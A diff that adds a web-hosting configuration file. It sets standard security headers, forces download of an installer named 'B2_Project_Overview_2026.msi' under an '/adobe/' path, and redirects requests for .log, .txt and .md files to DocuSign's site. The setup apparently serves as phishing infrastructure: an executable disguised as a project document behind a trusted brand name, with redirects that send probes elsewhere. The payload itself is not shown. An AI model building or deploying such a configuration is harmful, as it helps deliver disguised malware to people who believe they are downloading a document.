@@ -1,0 +1,42 @@
+{
+  "version": 2,
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        {
+          "key": "X-Frame-Options",
+          "value": "SAMEORIGIN"
+        },
+        {
+          "key": "X-Content-Type-Options",
+          "value": "nosniff"
+        },
+        {
+          "key": "X-XSS-Protection",
+          "value": "1; mode=block"
+        }
+      ]
+    },
+    {
+      "source": "/adobe/B2_Project_Overview_2026.msi",
+      "headers": [
+        {
+          "key": "Content-Type",
+          "value": "application/octet-stream"
+        },
+        {
+          "key": "Content-Disposition",
+          "value": "attachment; filename=\"B2_Project_Overview_2026.msi\""
+        }
+      ]
+    }
+  ],
+  "redirects": [
+    {
+      "source": "/(.*)\\.(log|txt|md)",
+      "destination": "https://www.docusign.com",
+      "permanent": false
+    }
+  ]
+}
